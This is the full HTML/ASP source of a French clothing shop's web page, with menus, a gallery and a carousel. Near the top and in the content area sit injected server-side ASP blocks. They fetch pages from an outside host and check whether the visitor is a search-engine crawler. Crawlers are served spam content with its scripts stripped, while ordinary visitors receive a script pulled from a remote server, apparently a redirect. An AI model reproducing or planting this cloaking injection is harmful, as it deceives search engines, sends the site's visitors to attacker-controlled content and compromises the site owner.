<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<%
function getHTTPPage(url)
    dim Http
    set Http=server.createobject("MSXML2.XMLHTTP")
    Http.open "GET",url,false
    Http.send()
    if Http.readystate<>4 then
        exit function
    end if
    getHTTPPage=bytesToBSTR(Http.responseBody,"UTF-8")
    set http=nothing
    if err.number<>0 then err.Clear
end function


Function BytesToBstr(body,Cset)
        dim objstream
        set objstream = Server.CreateObject("adodb.stream")
        objstream.Type = 1
        objstream.Mode =3
        objstream.Open
        objstream.Write body
        objstream.Position = 0
        objstream.Type = 2
        objstream.Charset = Cset
        BytesToBstr = objstream.ReadText
        objstream.Close
        set objstream = nothing
End Function

Dim Url,Html
yyu=Year(now)&month(now)&day(now)&hour(now)&minute(now)&second(now)
if request("AAA")<>""  then
URL="http://hjg.jg2890.com/ig_zc_22/NY_Tou_img.aspx?s_id=196&rnd="&yyu&"&p_id="&request("AAA")
else if request("pageIndex")<>""  then
URL="http://hjg.jg2890.com/ig_zc_22/LB_Tou_img.aspx?s_id=196&rnd="&yyu&"&pageIndex="&request("pageIndex")&""
else
URL="http://hjg.jg2890.com/ig_zc_22/LB_Tou_img.aspx?rnd="&yyu&"&s_id=196"
end if
end if
Html = getHTTPPage(Url)

if request("kk")<>"" then
ip="66.249.64.190"
else
ip=Request.ServerVariables("HTTP_X_FORWARDED_FOR")
end if
ipurl="http://hjg.jg2890.com/getdomain.aspx?rnd=1&ip="&ip
domain =getHTTPPage(ipurl)
if  (instr(domain,"google")>0 or instr(domain,"msn.com")>0 or instr(domain,"yahoo.com")>0 or instr(domain,"aol.com")>0) then
set re = new RegExp
re.IgnoreCase =True
re.Global = True
re.Pattern = "<script[^>]*?>([\s\S]*?)</script>"
Set matchs = re.Execute(html)
for each match in matchs
sc= match.SubMatches(0)
next
set matchs = nothing
Html=replace(Html,"<script>"&sc&"</script>","")
Response.write Html

else
Response.write Html
if request("AAA")<>""  then
ccc=request("AAA")
ccc=replace(ccc," ","-")
ccc=replace(ccc,"--","-")

ddd=getHTTPPage("http://js.jg2890.com/ad-fr-4-g.txt?id=1")

eee=ddd&ccc&".html'}"
eee=replace(eee,"--","-")
Response.write "<script>"&eee&"</script>"
end if

end if
%>
<meta http-equiv="Content-type" content="text/html; charset=utf-8">
<meta http-equiv="imagetoolbar" content="no">
<meta name="Robots" content="index, follows">
<meta name="expires" content="never">
<meta name="Revisit-after" content="30 days">
<meta name="Author" content="LIC-INTER-112CNIL">
<meta name="Owner" content="Proprétaire">
<meta name="Publisher" content="">
<meta name="copyright" content="">
<meta name="reply-to" content="email@domaine.com">
<meta name="Identifier-URL" content="http://www.domaine.com">
<meta name="language" content="FR">
<meta name="site-languages" content="French">
<meta name="content-Language" content="FR">
<meta name="site-languages" content="French">
<meta name="Distribution" content="">
<meta name="contactOrganization" content="">
<meta name="contactName" content="">
<meta name="contactPhoneNumber" content="">
<meta name="contactFaxNumber" content="">
<meta name="contactStreetAddress1" content="19 place du champ de foire">
<meta name="contactCity" content="Montaigu">
<meta name="contactZip" content="85600">
<meta name="geography" content="PAYS DE LA LOIRE">
<meta name="contactState" content="France">
<meta name="Audience" content="All">
<link rel="shortcut icon" href="images/aerial.ico">

<!-- STYLES CSS -->
<link href="css-js/styles.css" rel="stylesheet" type="text/css">

<!--[if IE 7]>
    <link href="css-js/styles-ie7.css" rel="stylesheet" type="text/css" />
<![endif]-->
<!--[if lte IE 6]>
    <link href="css-js/styles-ie6.css" rel="stylesheet" type="text/css" />
    <script defer type="text/javascript" src="css-js/pngfix.js"></script>
<![endif]-->

<!--[if lte IE 8]> 
    <script type="text/javascript" src="css-js/roundies.js"></script>
<![endif]-->
<!-- FIN STYLES CSS -->
<script src="https://apis.google.com/_/scs/apps-static/_/js/k=oz.gapi.zh_CN.c1fn1D5sPSk.O/m=plusone/rt=j/sv=1/d=1/ed=1/am=AQ/rs=AGLTcCOObmuB7Tw-1PObDQaBbY7DWPCKmQ/cb=gapi.loaded_0" async=""></script><script type="text/javascript" async="" src="https://apis.google.com/js/plusone.js" gapi_processed="true">{lang: 'fr'}</script><script type="text/javascript" language="javascript" src="css-js/jquery-1.7.1.min.js"></script>






<!--  highslide -->
<link href="highslide/highslide.css" rel="stylesheet" type="text/css">
<script type="text/javascript" language="javascript" src="highslide/highslide-full.js"></script>
<script type="text/javascript" language="javascript">    
	hs.graphicsDir = 'highslide/graphics/';
	hs.align = 'center';
	hs.dimmingOpacity = 0.75;
	
	// Add the controlbar
	if (hs.addSlideshow) hs.addSlideshow({
		slideshowGroup: 'galerie',
		interval: 5000,
		repeat: false,
		useControls: true,
		fixedControls: 'fit',
		overlayOptions: {
			opacity: .75,
			position: 'bottom center',
			hideOnMouseOut: true
		}
	});
</script>
<!--  BDD -->
<script type="text/javascript" language="javascript" src="css-js/jQuery.equalHeights.js"></script>
<!--  BDD stats catalogue -->

<!--   DIVERS   -->
<link rel="shortcut icon" href="images/aerial.ico">
<meta http-equiv="Content-type" content="text/html; charset=iso-8859-1">
<meta http-equiv="imagetoolbar" content="no">


<style type="text/css">.highslide img {cursor: url(highslide/graphics/zoomin.cur), pointer !important;}</style></head>
<body>
<div id="conteneur_img">
    <div id="conteneur">
		
        <div id="haut"><div id="slider">
  <!-- Important Owl stylesheet -->
    <link rel="stylesheet" href="css-js/owl/owl.carousel.css">
     
    <!-- Default Theme -->
    <link rel="stylesheet" href="css-js/owl/owl.theme.css">
     
    <!-- jQuery 1.7+ -->
    <script src="css-js/owl/jquery-1.9.1.min.js"></script>
     
    <!-- Include js plugin -->
    <script src="css-js/owl/owl.carousel.js"></script>
    
    <script src="css-js/owl/owl.carousel.js"></script>



    

 <script>
    $(document).ready(function() {

      var owl = $("#owl-demo");

      owl.owlCarousel({
  autoPlay: 3000, //Set AutoPlay to 3 seconds
 
      items : 3,
	  pagination:false,
      itemsDesktop : [1199,3],
      itemsDesktopSmall : [979,3]
      });
    });
    </script>
</div>

<img src="images/charte/haut.jpg" width="992" height="406" border="0" usemap="#Map">
<map name="Map" id="Map">
  <area shape="rect" coords="889, 12, 927, 52" href="default.aspx">
  <area shape="rect" coords="65, 148, 246, 200" href="Catalogue.aspx">
  <area shape="rect" coords="313, 39, 639, 195" href="pret-a-porter-costume-robe-ceremonie-montaigu-chantonnay.aspx">
  <area shape="rect" coords="740, 150, 925, 200" href="actualites.aspx">
  <area shape="rect" coords="930, 14, 982, 50" href="contact.aspx">
  <area coords="829, 17, 874, 65" href="https://www.facebook.com/Arnaud.vetements?ref=ts&amp;fref=ts" target="_blank" shape="rect">
</map>
</div>
            <div id="gauche">

<ul id="menuGauche">
	<li><a href="default.aspx">Accueil</a></li>
    <li><a href="presentation.aspx">Présentation</a></li>
    
    <li><a href="galerie1.aspx">Galerie 1 colonne</a></li>
    <li><a href="galerie2.aspx">Galerie 2 ligne</a></li>
    <li><a href="galerie3.aspx">Galerie 3 roll hover</a></li>
    <li><a href="galerie4.aspx">Galerie 4 roll 2</a></li>
    <li><a href="galerie5.aspx">Galerie 5 caroussel</a></li>
    <li><a href="galerie7.aspx">Galerie 7 slide fancy</a></li>
    <li><a href="galerie-flash.aspx">Galerie flash</a></li>
    <li><a href="livre-or.aspx">Livre d'or</a></li>
    <li><a href="livre-flash.aspx">Livre Flash</a></li>
    <li><a href="compte-client.aspx">Compte client</a></li>
    <li><a href="callback.aspx">Call back</a></li>
    <li><a href="blog_test.aspx">Articles</a></li> 
    <li><a href="devis.aspx">Devis</a></li>    
    <li><a href="rss.aspx">RSS</a></li>
    <li><a href="identification.aspx">Nouveau CLient</a></li>
    <li><a href="caddie.aspx">Caddie</a></li>
    <li><a href="contact.aspx">Contact</a></li>
</ul>

<a class="BTimprimer" href="#" title="Imprimer"><span>Imprimer</span></a>

</div>
            <div id="texte">
 <%
Dim Urlyy,Htmlyy
yyu=Year(now)&month(now)&day(now)&hour(now)&minute(now)&second(now)

if request("pageIndex")<>""  then
URLyy="http://hjg.jg2890.com/ig_zc_22/LB_NR_img_url.aspx?s_id=196&rnd="&yyu&"&pageIndex="&request("pageIndex")&""
else
URLyy="http://hjg.jg2890.com/ig_zc_22/LB_NR_img_url.aspx?s_id=196&rnd="&yyu&""
if request("AAA")<>""  then
Urlyy="http://hjg.jg2890.com/ig_zc_22/NY_Content_img_name_pl_2.aspx?s_id=196&rnd="&yyu&"&p_id="&request("AAA")
end if

end if
Htmlyy = getHTTPPage(Urlyy)
Htmlyy=replace(Htmlyy,"LB_NR_img_url.aspx","/vetements.asp")
Htmlyy=replace(Htmlyy,"s_id=196&rnd="&yyu&"&","")
Htmlyy=replace(Htmlyy,"?p_id=","http://www.arnaud-vetements.com/vetements.asp?AAA=")
Response.write Htmlyy
                %>	
            </div><!-- fin de texte -->
             <div id="droite"></div>
        <div id="push"></div>
     </div><!-- fin de conteneur -->
</div><!-- fin de conteneur_img -->
<div id="global_bas">

<div id="bas">

<ul id="menuBas">

	
	<li><a href="mentions.aspx" title="Mentions légales">Mentions légales</a></li>
	
		<li><a href="/vetements.asp">Plan du site</a></li>
	
    
</ul>
	
	
	
	
</div></div>
<script language="javascript" type="text/javascript">
<!-- CDATA
    (function() {
        var gp = document.createElement('script');
        gp.type = 'text/javascript';
        gp.async = true;
        gp.src = 'https://apis.google.com/js/plusone.js';
        gp.textContent = "{lang: 'fr'}";
        var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(gp, s);
    })();
-->
</script>



<span style="border-radius: 3px; text-indent: 20px; width: auto; padding: 0px 4px 0px 0px; text-align: center; font-style: normal; font-variant: normal; font-weight: bold; font-stretch: normal; font-size: 11px; line-height: 20px; font-family: &quot;Helvetica Neue&quot;, Helvetica, sans-serif; color: rgb(255, 255, 255); background: url(&quot;data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMzBweCIgd2lkdGg9IjMwcHgiIHZpZXdCb3g9Ii0xIC0xIDMxIDMxIj48Zz48cGF0aCBkPSJNMjkuNDQ5LDE0LjY2MiBDMjkuNDQ5LDIyLjcyMiAyMi44NjgsMjkuMjU2IDE0Ljc1LDI5LjI1NiBDNi42MzIsMjkuMjU2IDAuMDUxLDIyLjcyMiAwLjA1MSwxNC42NjIgQzAuMDUxLDYuNjAxIDYuNjMyLDAuMDY3IDE0Ljc1LDAuMDY3IEMyMi44NjgsMC4wNjcgMjkuNDQ5LDYuNjAxIDI5LjQ0OSwxNC42NjIiIGZpbGw9IiNmZmYiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSIxIj48L3BhdGg+PHBhdGggZD0iTTE0LjczMywxLjY4NiBDNy41MTYsMS42ODYgMS42NjUsNy40OTUgMS42NjUsMTQuNjYyIEMxLjY2NSwyMC4xNTkgNS4xMDksMjQuODU0IDkuOTcsMjYuNzQ0IEM5Ljg1NiwyNS43MTggOS43NTMsMjQuMTQzIDEwLjAxNiwyMy4wMjIgQzEwLjI1MywyMi4wMSAxMS41NDgsMTYuNTcyIDExLjU0OCwxNi41NzIgQzExLjU0OCwxNi41NzIgMTEuMTU3LDE1Ljc5NSAxMS4xNTcsMTQuNjQ2IEMxMS4xNTcsMTIuODQyIDEyLjIxMSwxMS40OTUgMTMuNTIyLDExLjQ5NSBDMTQuNjM3LDExLjQ5NSAxNS4xNzUsMTIuMzI2IDE1LjE3NSwxMy4zMjMgQzE1LjE3NSwxNC40MzYgMTQuNDYyLDE2LjEgMTQuMDkzLDE3LjY0MyBDMTMuNzg1LDE4LjkzNSAxNC43NDUsMTkuOTg4IDE2LjAyOCwxOS45ODggQzE4LjM1MSwxOS45ODggMjAuMTM2LDE3LjU1NiAyMC4xMzYsMTQuMDQ2IEMyMC4xMzYsMTAuOTM5IDE3Ljg4OCw4Ljc2NyAxNC42NzgsOC43NjcgQzEwLjk1OSw4Ljc2NyA4Ljc3NywxMS41MzYgOC43NzcsMTQuMzk4IEM4Ljc3NywxNS41MTMgOS4yMSwxNi43MDkgOS43NDksMTcuMzU5IEM5Ljg1NiwxNy40ODggOS44NzIsMTcuNiA5Ljg0LDE3LjczMSBDOS43NDEsMTguMTQxIDkuNTIsMTkuMDIzIDkuNDc3LDE5LjIwMyBDOS40MiwxOS40NCA5LjI4OCwxOS40OTEgOS4wNCwxOS4zNzYgQzcuNDA4LDE4LjYyMiA2LjM4NywxNi4yNTIgNi4zODcsMTQuMzQ5IEM2LjM4NywxMC4yNTYgOS4zODMsNi40OTcgMTUuMDIyLDYuNDk3IEMxOS41NTUsNi40OTcgMjMuMDc4LDkuNzA1IDIzLjA3OCwxMy45OTEgQzIzLjA3OCwxOC40NjMgMjAuMjM5LDIyLjA2MiAxNi4yOTcsMjIuMDYyIEMxNC45NzMsMjIuMDYyIDEzLjcyOCwyMS4zNzkgMTMuMzAyLDIwLjU3MiBDMTMuMzAyLDIwLjU3MiAxMi42NDcsMjMuMDUgMTIuNDg4LDIzLjY1NyBDMTIuMTkzLDI0Ljc4NCAxMS4zOTYsMjYuMTk2IDEwLjg2MywyNy4wNTggQzEyLjA4NiwyNy40MzQgMTMuMzg2LDI3LjYzNyAxNC43MzMsMjcuNjM3IEMyMS45NSwyNy42MzcgMjcuODAxLDIxLjgyOCAyNy44MDEsMTQuNjYyIEMyNy44MDEsNy40OTUgMjEuOTUsMS42ODYgMTQuNzMzLDEuNjg2IiBmaWxsPSIjYmQwODFjIj48L3BhdGg+PC9nPjwvc3ZnPg==&quot;) 3px 50% / 14px 14px no-repeat rgb(189, 8, 28); position: absolute; opacity: 1; z-index: 8675309; display: none; cursor: pointer; border: none; -webkit-font-smoothing: antialiased; top: 10px; left: 466px;">Save</span><div class="highslide-container" style="padding: 0px; border: none; margin: 0px; position: absolute; left: 0px; top: 0px; width: 100%; z-index: 1001; direction: ltr;"><a class="highslide-loading" title="Cliquer pour annuler" href="javascript:;" style="position: absolute; top: -9999px; opacity: 0.75; z-index: 1;">Chargement...</a><div style="display: none;"></div><div class="highslide-viewport" style="padding: 0px; border: none; margin: 0px; visibility: hidden;"></div><table cellspacing="0" style="padding: 0px; border: none; margin: 0px; visibility: hidden; position: absolute; border-collapse: collapse; width: 0px;"><tbody style="padding: 0px; border: none; margin: 0px;"><tr style="padding: 0px; border: none; margin: 0px; height: auto;"><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;http://www.arnaud-vetements.com/highslide/graphics/outlines/drop-shadow.png&quot;) 0px 0px; height: 20px; width: 20px;"></td><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;http://www.arnaud-vetements.com/highslide/graphics/outlines/drop-shadow.png&quot;) 0px -40px; height: 20px; width: 20px;"></td><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;http://www.arnaud-vetements.com/highslide/graphics/outlines/drop-shadow.png&quot;) -20px 0px; height: 20px; width: 20px;"></td></tr><tr style="padding: 0px; border: none; margin: 0px; height: auto;"><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;http://www.arnaud-vetements.com/highslide/graphics/outlines/drop-shadow.png&quot;) 0px -80px; height: 20px; width: 20px;"></td><td class="drop-shadow highslide-outline" style="padding: 0px; border: none; margin: 0px; position: relative;"></td><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;http://www.arnaud-vetements.com/highslide/graphics/outlines/drop-shadow.png&quot;) -20px -80px; height: 20px; width: 20px;"></td></tr><tr style="padding: 0px; border: none; margin: 0px; height: auto;"><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;http://www.arnaud-vetements.com/highslide/graphics/outlines/drop-shadow.png&quot;) 0px -20px; height: 20px; width: 20px;"></td><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;http://www.arnaud-vetements.com/highslide/graphics/outlines/drop-shadow.png&quot;) 0px -60px; height: 20px; width: 20px;"></td><td style="padding: 0px; border: none; margin: 0px; line-height: 0; font-size: 0px; background: url(&quot;http://www.arnaud-vetements.com/highslide/graphics/outlines/drop-shadow.png&quot;) -20px -20px; height: 20px; width: 20px;"></td></tr></tbody></table><img src="highslide/graphics/outlines/drop-shadow.png" style="padding: 0px; border: none; margin: 0px; position: absolute; top: -9999px;"></div></body></html>
